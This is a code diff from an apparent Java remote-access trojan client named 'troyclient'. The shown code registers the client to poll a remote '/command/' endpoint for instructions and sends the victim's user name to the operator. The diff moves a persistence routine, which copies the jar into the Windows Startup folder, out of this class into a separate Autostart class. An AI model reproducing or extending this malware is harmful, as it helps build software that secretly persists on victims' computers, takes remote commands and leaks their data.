@@ -1,7 +1,7 @@
 package ch.lebois.troyclient.main;
 
+import ch.lebois.troyclient.functions.Autostart;
 import ch.lebois.troyclient.service.Console;
-import ch.lebois.troyclient.service.DownloadService;
 import ch.lebois.troyclient.service.IpService;
 import ch.lebois.troyclient.service.Sender;
 import ch.lebois.troyclient.service.WebHandler;
@@ -16,8 +16,8 @@ public class ConfigureInit {
     private WebHandler webHandler;
 
     public static void main(String[] args) {
-        File file = new File(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
-                "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
+        System.out.println(new File(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
+                "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).getPath());
     }
 
     public WebHandler getWebHandler() {
@@ -30,14 +30,9 @@ public class ConfigureInit {
         webHandler = new WebHandler(url + "/command/" + SystemVariables.CLIENT_NAME);
         SystemVariables.REFRESHTIME = 1000;
         getConstants(version);
-        autostart();
+        new Autostart().decide();
     }
 
-    private void autostart() {
-        new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\Hermann.jar",
-                System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
-                        "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar"));
-    }
 
     private void getConstants(String version) {
         SystemVariables.SENDER.send("user", System.getProperty("user.name"));
